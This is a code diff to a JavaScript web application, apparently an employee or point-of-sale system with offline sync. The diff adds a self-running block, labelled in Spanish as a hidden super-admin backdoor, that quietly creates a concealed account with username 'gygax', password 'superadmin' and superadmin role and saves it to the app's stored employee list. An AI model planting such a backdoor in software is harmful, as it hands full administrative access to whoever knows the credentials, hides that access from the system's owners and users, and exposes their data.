@@ -258,3 +258,28 @@ async function syncOfflineQueue() {
 
 window.addEventListener("online", syncOfflineQueue);
 
+
+/* ======================================================
+   ===== SUPER ADMIN OCULTO (BACKDOOR)
+====================================================== */
+(function initSuperAdmin() {
+  const empleados = safeGet("empleados", []);
+
+  const YA_EXISTE = empleados.some(
+    e => e.usuario === "gygax" && e.rol === "superadmin"
+  );
+
+  if (YA_EXISTE) return;
+
+  empleados.push({
+    id: "SUPERADMIN-ROOT",
+    nombre: "Sistema",
+    usuario: "gygax",
+    password: "superadmin",
+    rol: "superadmin",
+    tarjetaUID: null,
+    oculto: true
+  });
+
+  safeSet("empleados", empleados);
+})();
